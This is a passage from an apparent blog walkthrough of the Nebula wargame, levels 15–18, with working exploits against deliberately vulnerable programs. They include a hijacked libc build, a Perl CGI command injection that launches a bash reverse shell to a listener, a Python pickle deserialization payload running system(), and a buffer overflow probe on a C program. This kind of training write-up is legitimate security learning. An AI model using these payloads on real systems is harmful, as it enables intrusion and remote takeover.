<span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</span>
<span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)</span>
<span class="go">/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</span>
</code></pre></div>
</p>

<p>What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux&rsquo;s demands. I searched around and found out about <a href="http://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html">version scripts</a>. Let&rsquo;s hope it works</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level15@nebula:/var/tmp/flag15$</span> cat version
<span class="go">GLIBC_2.0 { };</span>
<span class="gp">level15@nebula:/var/tmp/flag15$</span> gcc -shared -fPIC -o libc.so.6 mylibc.c -Wl,--version-script<span class="o">=</span>version
<span class="gp">level15@nebula:/var/tmp/flag15$</span> ~flag15/flag15
<span class="go">/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</span>
</code></pre></div>
</p>

<p><em>sigh</em> - symbol <code>system</code> is missing. Ok, let&rsquo;s just build it statically and wrap it all up so we&rsquo;ve got everything we need. From <code>man gcc</code></p>

<blockquote>
<p><strong>-static-libgcc</strong>
          On systems that provide libgcc as a shared library, these options force the use of either the shared or
          static version respectively.  If no shared version of libgcc
          was built when the compiler was configured, these options have no effect.</p>
</blockquote>

<p>So really we can also get rid of our implementation of <code>__cxa_finalize</code> as it&rsquo;s all statically linked now.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level15@nebula:/var/tmp/flag15$</span> gcc -fPIC -shared -static-libgcc -Wl,--version-script<span class="o">=</span>version,-Bstatic -o libc.so.6 mylibc.c
<span class="gp">level15@nebula:/var/tmp/flag15$</span> ~flag15/flag15
<span class="gp">sh-4.2$</span> whoami
<span class="go">flag15</span>
<span class="gp">sh-4.2$</span> getflag
<span class="go">You have successfully executed getflag on a target account</span>
</code></pre></div>
</p>

<h2 id="level-16:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 16</h2>

<blockquote>
<p>There is a perl script running on port 1616.</p>
</blockquote>

<p><div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="c1">#!/usr/bin/env perl</span>

<span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>

<span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>

<span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span>  <span class="c1"># conver to uppercase</span>
  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>    <span class="c1"># strip everything after a space</span>

  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`</span><span class="p">;</span>
  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
  

    <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span> 
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Your login was accepted&lt;br/&gt;&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Your login failed&lt;br/&gt;&quot;</span><span class="p">);</span>
  <span class="p">}</span>  
  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">htmlz</span><span class="p">(</span><span class="n">login</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">),</span> <span class="n">param</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">)));</span>
</code></pre></div>
</p>

<p>So quickly looking at the script we know that we need to pass <code>username</code> and <code>password</code> in as URL parameters. It then does some uppercase conversion of the username, strips the whitespace and greps for the username in a file called <code>userdb.txt</code>. Taking a look at this file we notice it&rsquo;s empty, so we need a different exploit. The obvious place here is the <code>egrep</code> call as it accepts our username. But we need to do some twiddling in order to get it working with the uppercase and whitespace strip.</p>

<p>One idea is to use bash&rsquo;s feature that allows us to run a command with a wildcard in the path. For example you can run <code>/bin/ls</code> with <code>/*/ls</code> instead. This
gets us around the uppercase limitation as we can create an uppercase command
at a path we can write to. I&rsquo;ve chosen <code>/tmp</code> as my target.
I&rsquo;m going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level16@nebula:~$</span> nc -l 1337
</code></pre></div>
</p>

<p>To create a netcat listener on port <em>1337</em></p>

<p>Next I construct the payload for the script</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level16@nebula:/home/flag16$</span> cat /tmp/RSHELL
<span class="gp">#</span>!/bin/bash
<span class="go">bash -i &gt;&amp; /dev/tcp/192.168.56.101/1337 0&gt;&amp;1</span>
<span class="gp">level16@nebula:/home/flag16$</span> chmod +x /tmp/SHELL
</code></pre></div>
</p>

<p>Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">http://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%</span>60<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>test2
</code></pre></div>
</p>

<p>Back in the shell where we launched the netcat listener we do the following (the <code>whoami</code> is just to confirm I am the right user)</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level16@nebula:~$</span> nc -l 1337
<span class="go">bash: no job control in this shell</span>
<span class="gp">flag16@nebula:/home/flag16$</span> getflag
<span class="go">getflag</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">flag16@nebula:/home/flag16$</span> whoami
<span class="go">whoami</span>
<span class="go">flag16</span>
</code></pre></div>
</p>

<h2 id="level-17:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 17</h2>

<blockquote>
<p>There is a python script listening on port 10007 that contains a vulnerability.</p>
</blockquote>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">signal</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
  <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

  <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
    <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;why did you send me &quot;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">&quot;?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">skt</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>
<span class="n">skt</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>

  <span class="k">if</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
    <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Accepted connection from </span><span class="si">%s</span><span class="s">:</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
    <span class="n">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>
</p>

<p>Here <code>pickle</code> provides us with the possibility of an exploit to run our own code. There&rsquo;s lots to read on the security issues with <code>pickle</code>, but to be fair it was never meant to be secure in itself. <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a> and <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> are a good source for more info.</p>

<p>Right, so my plan is to get a shell as <em>flag17</em> and get the flag from there. Using pickle&rsquo;s opcodes I can construct a string that will run <code>getflag</code> from the <code>pickle.loads</code> call as user <em>flag17</em>. So before I started constructing this I copied the script and ran it as <em>level17</em> on a different port in order to debug and see what&rsquo;s going on. Once I was happy with my exploit code I changed the port to <code>10007</code> and ran it to get the flag.</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/bin/python</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">skt</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>
<span class="k">print</span> <span class="n">skt</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span> <span class="n">data</span>
<span class="n">sent</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;cos</span><span class="se">\n</span><span class="s">system</span><span class="se">\n</span><span class="s">(S&#39;/bin/bash -c /bin/getflag &gt; /tmp/f17pwned&#39;</span><span class="se">\n</span><span class="s">tR</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
<span class="k">print</span> <span class="n">sent</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span> <span class="n">data</span>
<span class="n">skt</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>
</p>

<p>I&rsquo;ll explain the pickle string a bit:</p>

<ul>
<li><code>cos\nsystem</code> resolves the classname and calls it</li>
<li><code>(</code> is the marker</li>
<li><code>S'/bin/bash -c /bin/getflag &gt; /tmp/f17pwned'\n</code> this is our command we want to run</li>
<li><code>tR\n</code> - <code>t</code> puts the string onto the stack and <code>R</code> pops this tuple and calls it, thus executing our lovingly crafted payload.</li>
</ul>

<p>Once run it looks like it worked so let&rsquo;s be sure</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level17@nebula:/tmp/flag17$</span> cat ../f17pwned
<span class="go">You have successfully executed getflag on a target account</span>
</code></pre></div>
</p>

<h2 id="level-18:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 18</h2>

<blockquote>
<p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p>
</blockquote>

<p><div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;fcntl.h&gt;</span>
<span class="cp">#include &lt;getopt.h&gt;</span>

<span class="k">struct</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
<span class="p">}</span> <span class="n">globals</span><span class="p">;</span>

<span class="cp">#define dprintf(...) if(globals.debugfile) \</span>
<span class="cp">  fprintf(globals.debugfile, __VA_ARGS__)</span>
<span class="cp">#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \</span>
<span class="cp">  fprintf(globals.debugfile, __VA_ARGS__)</span>

<span class="cp">#define PWFILE &quot;/home/flag18/password&quot;</span>

<span class="kt">void</span> <span class="nf">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>

  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Unable to read password file %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
                <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>    
  <span class="p">}</span>
  <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;logged in successfully (with%s password file)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> 
    <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="s">&quot;out&quot;</span> <span class="o">:</span> <span class="s">&quot;&quot;</span><span class="p">);</span>
  
  <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;--&gt; [%s] is unsupported at this current time.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
  <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

  <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">&quot;unable to set user to &#39;%s&#39; -- not supported.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>

  <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">&quot;d:v&quot;</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">case</span> <span class="sc">&#39;d&#39;</span><span class="o">:</span>
        <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="s">&quot;w+&quot;</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">optarg</span><span class="p">);</span>
        <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="sc">&#39;v&#39;</span><span class="o">:</span>
        <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Starting up. Verbose level = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span>

  <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
  <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
  
  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>

    <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;got [%s] as input</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to login</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
      <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;shell&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to start shell</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
      <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;unable to execve&quot;</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Permission denied</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;closelog&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
      <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;site exec&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;setuser&quot;</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</p>

<p>This is quite a lot a of code, but let&rsquo;s see what it does. The program accepts
two arguments <code>-v</code> and <code>-d</code> which increase verbosity level and set a debug file
respectively. If you launch it with <code>flag18 -v -v -v -d /tmp/debug</code> and then
<code>tail -f /tmp/debug</code> you can see what&rsquo;s going on. I used 3 <code>-v</code> because that&rsquo;s
the max debug level to be sure to capture everything.</p>

<p>Once it&rsquo;s running there&rsquo;s a number of commands we can issue. These are probably
going to give us something to poke around with. We can try to get a shell with
the <em>shell</em> command, but that means we need to be logged in. I&rsquo;ll make a
note of that. The <code>setuser</code> function has a fixed sized buffer. Let&rsquo;s try to
overflow that</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> python -c <span class="s2">&quot;print(&#39;setuser &#39; + &#39;A&#39;*128)&quot;</span> <span class="p">|</span> ./flag18 -v -v -v -d /tmp/flag18/debug
<span class="go">*** buffer overflow detected ***: ./flag18 terminated</span>
<span class="go">======= Backtrace: =========</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6998d5]</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x6986d7]</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x697d35]</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x61df91]</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x5f5305]</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x697e09]</span>
<span class="go">/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x697d1f]</span>
<span class="go">./flag18[0x8048df5]</span>
<span class="go">./flag18[0x8048b1b]</span>
